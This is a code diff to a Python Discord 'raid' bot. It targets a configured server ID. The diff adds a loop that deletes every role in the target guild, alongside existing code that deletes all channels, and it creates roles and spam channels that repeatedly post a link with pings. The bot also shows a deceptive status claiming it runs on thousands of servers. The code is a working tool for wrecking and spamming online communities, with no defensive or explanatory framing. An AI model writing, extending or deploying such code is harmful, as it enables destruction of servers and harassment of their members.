@@ -7,7 +7,7 @@ raidID = 0 #Server ID to be raided
 start_message = "nooo" #primary message
 spam_message = "https://youtu.be/WnVltopWrfY" #The message to be spammed 3 times per channel along with a ping
 bot_status = "Running on 5258 servers!" #Bot statussss
-possible_names = ["L"] #The possible names of the new channels created
+possible_names = ["L"] #The possible names of the new channels and roles created
 
 class myClient(discord.Client):
     def __init__(self, *, intents):
@@ -34,6 +34,12 @@ def main():
 
     async def proccess_reponse(interaction: interactions.Interaction):
         if interaction.guild_id == raidID:
+            for x in list(interaction.guild.roles):
+                try:
+                    await x.delete()
+                except:
+                    pass
+
             for x in list(interaction.guild.channels):
                 try:
                     await x.delete()
@@ -60,6 +66,8 @@ def main():
                 try:
                     guild = client.get_guild(interaction.guild_id)
                     channel = await guild.create_text_channel(category=spam_category, name=random.choice(possible_names))
+
+                    await interaction.guild.create_role(name=random.choice(possible_names))
                     
                     for x in range(0, 3):
                         to_send = client.get_channel(channel.id)
